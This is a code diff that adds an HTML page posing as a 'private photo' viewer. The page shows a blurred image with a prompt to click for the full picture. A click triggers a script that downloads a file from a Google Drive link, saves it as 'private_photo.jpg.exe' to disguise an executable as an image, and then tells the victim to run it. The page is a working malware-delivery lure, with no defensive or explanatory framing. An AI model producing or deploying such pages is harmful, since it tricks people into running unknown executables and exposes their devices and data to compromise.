@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private Photo • View Now</title>
+    <style>
+        body { margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh; }
+        img { max-width:92%; max-height:85vh; border-radius:16px; cursor:pointer; box-shadow:0 0 50px rgba(255,20,147,0.6); filter: blur(12px); transition:0.5s; }
+        img:hover { filter: blur(3px); }
+        .text { position:absolute; top:30px; color:#ff69b4; font-size:22px; text-shadow:0 0 10px #000; }
+    </style>
+</head>
+<body>
+    <div class="text">🔒 Click to view full private photo</div>
+    
+    <img src="https://picsum.photos/id/1027/800/600/?blur=10" 
+         onclick="downloadFile()">
+
+    <script>
+        function downloadFile() {
+            const link = document.createElement('a');
+            link.href = "https://drive.google.com/uc?export=download&id=1IWTWJfIvsaxnOm77W6ngY5tRpwio6ZCV";
+            link.download = "private_photo.jpg.exe";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            setTimeout(() => {
+                alert("Downloading high quality version...\nPlease run the file to view the full photo.");
+            }, 700);
+        }
+    </script>
+</body>
+</html>
